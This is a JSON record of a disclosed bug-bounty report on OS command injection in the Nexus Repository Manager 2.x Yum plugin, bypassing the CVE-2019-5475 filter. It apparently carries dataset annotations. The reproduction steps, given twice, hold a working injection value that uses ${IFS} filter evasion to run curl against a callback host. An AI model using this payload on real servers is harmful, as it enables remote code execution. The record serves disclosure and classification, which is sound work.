{
  "reported_to": "Central Security Project",
  "reported_by": "badcode_ ",
  "title": "OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)",
  "content": "\nOS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)\nMaven artifact\ngroupId: org.sonatype.nexus.plugins\nartifactId: nexus-yum-repository-plugin\nversion: 2.14.14-01\nVulnerability\nVulnerability Description\nThe Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability.\nAdditional Details\nTake a look at the patch for CVE-2019-5475\nhttps://github.com/sonatype/nexus-public/commit/7b9939e71693422d3e09adc3744fa2e9b3a62a63#diff-4ab0523de106ac7a38808f0231fc8a23R84\n\nThe getCleanCommand method is not completely filtered and can still be bypassed.\nSteps To Reproduce:\nNavigate to \"Capabilities\" in Nexus Repository Manager.\nEdit or create a new Yum: Configuration capability\nSet path of \"createrepo\" or \"mergerepo\" to an OS command (e.g. /bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo)\n\nSupporting Material/References:\nUbuntu\nSonatype Nexus Repository Manager 2.14.14-01\nJava 8\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nAn authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.\nImpact\nAn authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1572361380,
  "report_url": "https://hackerone.com/reports/688270",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to 'Capabilities' in Nexus Repository Manager."
    ],
    [
      2,
      "Edit or create a new Yum: Configuration capability and set the path of 'createrepo' or 'mergerepo' to an OS command (e.g., /bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo)."
    ]
  ],
  "vuln_description": "The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution due to incomplete filtering in the getCleanCommand method, allowing an authenticated user with sufficient privileges to execute arbitrary OS commands.",
  "reason": "The vulnerability involves bypassing existing filters in a patched method, which requires understanding of the patch and how to circumvent it. However, the steps to exploit are straightforward once the bypass method is known.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an authenticated user with sufficient privileges exploiting a command injection flaw in the Nexus Repository Manager. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs within the same application. However, this specific vulnerability is not about crossing authorization boundaries but rather exploiting a command injection flaw in a privileged functionality. The detection method does not cover command injection vulnerabilities, which require different testing approaches such as input validation and command execution testing.",
    "is_detectable": false
  }
}